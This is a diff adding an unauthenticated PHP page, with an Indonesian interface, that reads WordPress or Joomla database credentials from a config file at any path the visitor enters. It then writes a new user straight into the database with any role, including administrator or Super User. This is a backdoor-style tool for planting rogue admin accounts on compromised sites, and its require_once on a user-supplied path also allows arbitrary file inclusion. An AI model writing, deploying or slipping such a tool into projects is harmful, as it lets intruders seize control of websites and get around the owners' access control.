@@ -1,0 +1,133 @@
+<?php
+function showForm($error = '') {
+    echo "<h2>Tambah User (WordPress / Joomla)</h2>";
+    if ($error) echo "<p style='color:red;'>$error</p>";
+    echo <<<FORM
+<form method="POST">
+    <label>Path ke Config File (wp-config.php / configuration.php):</label><br>
+    <input type="text" name="config_path" style="width:100%" required><br><br>
+
+    <label>Pilih CMS:</label><br>
+    <select name="cms" onchange="toggleRole(this.value)">
+        <option value="wordpress">WordPress</option>
+        <option value="joomla">Joomla</option>
+    </select><br><br>
+
+    <label>Nama Lengkap:</label><br>
+    <input type="text" name="name" required><br><br>
+
+    <label>Username:</label><br>
+    <input type="text" name="username" required><br><br>
+
+    <label>Password:</label><br>
+    <input type="text" name="password" required><br><br>
+
+    <label>Email:</label><br>
+    <input type="email" name="email" required><br><br>
+
+    <div id="wp_role">
+        <label>Role WordPress:</label><br>
+        <select name="role_wp">
+            <option value="subscriber">Subscriber</option>
+            <option value="contributor">Contributor</option>
+            <option value="author">Author</option>
+            <option value="editor">Editor</option>
+            <option value="administrator">Administrator</option>
+        </select><br><br>
+    </div>
+
+    <div id="joomla_role" style="display:none;">
+        <label>Group ID Joomla (Contoh: 8 = Super User, 2 = Registered):</label><br>
+        <input type="number" name="role_joomla"><br><br>
+    </div>
+
+    <input type="submit" value="Tambah User">
+</form>
+
+<script>
+function toggleRole(cms) {
+    document.getElementById('wp_role').style.display = cms === 'wordpress' ? 'block' : 'none';
+    document.getElementById('joomla_role').style.display = cms === 'joomla' ? 'block' : 'none';
+}
+</script>
+FORM;
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $config_path = $_POST['config_path'];
+    $cms = $_POST['cms'];
+    $name = $_POST['name'];
+    $username = $_POST['username'];
+    $password_plain = $_POST['password'];
+    $email = $_POST['email'];
+    $role_wp = $_POST['role_wp'] ?? '';
+    $role_joomla = $_POST['role_joomla'] ?? '';
+
+    if (!file_exists($config_path)) {
+        showForm("Config file tidak ditemukan: $config_path");
+        exit;
+    }
+
+    if ($cms === 'wordpress') {
+        $contents = file_get_contents($config_path);
+        preg_match("/define\s*\(\s*'DB_NAME'\s*,\s*'(.+?)'\s*\)/", $contents, $db_name);
+        preg_match("/define\s*\(\s*'DB_USER'\s*,\s*'(.+?)'\s*\)/", $contents, $db_user);
+        preg_match("/define\s*\(\s*'DB_PASSWORD'\s*,\s*'(.+?)'\s*\)/", $contents, $db_pass);
+        preg_match("/define\s*\(\s*'DB_HOST'\s*,\s*'(.+?)'\s*\)/", $contents, $db_host);
+        preg_match("/\\\$table_prefix\s*=\s*'(.+?)';/", $contents, $prefix);
+        [$host, $user, $pass, $db, $prefix] = [$db_host[1], $db_user[1], $db_pass[1], $db_name[1], $prefix[1]];
+
+        $mysqli = new mysqli($host, $user, $pass, $db);
+        if ($mysqli->connect_error) die("DB Error: " . $mysqli->connect_error);
+
+        $stmt = $mysqli->prepare("SELECT ID FROM {$prefix}users WHERE user_login = ? OR user_email = ?");
+        $stmt->bind_param('ss', $username, $email);
+        $stmt->execute(); $stmt->store_result();
+        if ($stmt->num_rows > 0) die("Username/email sudah digunakan (WP).");
+        $stmt->close();
+
+        $hashed = password_hash($password_plain, PASSWORD_BCRYPT);
+        $now = date('Y-m-d H:i:s');
+        $stmt = $mysqli->prepare("INSERT INTO {$prefix}users (user_login, user_pass, user_nicename, user_email, user_status, display_name, user_registered) VALUES (?, ?, ?, ?, 0, ?, ?)");
+        $stmt->bind_param('ssssss', $username, $hashed, $username, $email, $name, $now);
+        $stmt->execute(); $user_id = $stmt->insert_id; $stmt->close();
+
+        $cap = serialize([$role_wp => true]);
+        $level = ['administrator'=>10,'editor'=>7,'author'=>2,'contributor'=>1,'subscriber'=>0][$role_wp] ?? 0;
+        $stmt = $mysqli->prepare("INSERT INTO {$prefix}usermeta (user_id, meta_key, meta_value) VALUES (?, ?, ?)");
+        $meta_key = $prefix.'capabilities'; $stmt->bind_param('iss', $user_id, $meta_key, $cap); $stmt->execute(); $stmt->close();
+        $stmt = $mysqli->prepare("INSERT INTO {$prefix}usermeta (user_id, meta_key, meta_value) VALUES (?, ?, ?)");
+        $meta_key = $prefix.'user_level'; $meta_val = (string)$level; $stmt->bind_param('iss', $user_id, $meta_key, $meta_val); $stmt->execute(); $stmt->close();
+        echo "<p>User WordPress berhasil ditambahkan! ID: $user_id</p>";
+
+    } elseif ($cms === 'joomla') {
+        require_once $config_path;
+        $conf = new JConfig();
+        $mysqli = new mysqli($conf->host, $conf->user, $conf->password, $conf->db);
+        if ($mysqli->connect_error) die("DB Error: " . $mysqli->connect_error);
+        $prefix = $conf->dbprefix;
+
+        $stmt = $mysqli->prepare("SELECT id FROM {$prefix}users WHERE username = ? OR email = ?");
+        $stmt->bind_param('ss', $username, $email); $stmt->execute(); $stmt->store_result();
+        if ($stmt->num_rows > 0) die("Username/email sudah digunakan (Joomla)."); $stmt->close();
+
+        $hash = password_hash($password_plain, PASSWORD_BCRYPT);
+        $now = date('Y-m-d H:i:s'); $activation = bin2hex(random_bytes(16));
+        $stmt = $mysqli->prepare("INSERT INTO {$prefix}users (name, username, email, password, registerDate, activation, params) VALUES (?, ?, ?, ?, ?, ?, '{}')");
+        $stmt->bind_param('ssssss', $name, $username, $email, $hash, $now, $activation);
+        $stmt->execute(); $user_id = $stmt->insert_id; $stmt->close();
+
+        $group_id = (int)$role_joomla;
+        $stmt = $mysqli->prepare("INSERT INTO {$prefix}user_usergroup_map (user_id, group_id) VALUES (?, ?)");
+        $stmt->bind_param('ii', $user_id, $group_id); $stmt->execute(); $stmt->close();
+
+        echo "<p>User Joomla berhasil ditambahkan! ID: $user_id</p>";
+    } else {
+        showForm("CMS tidak dikenal.");
+        exit;
+    }
+
+} else {
+    showForm();
+}
+?>
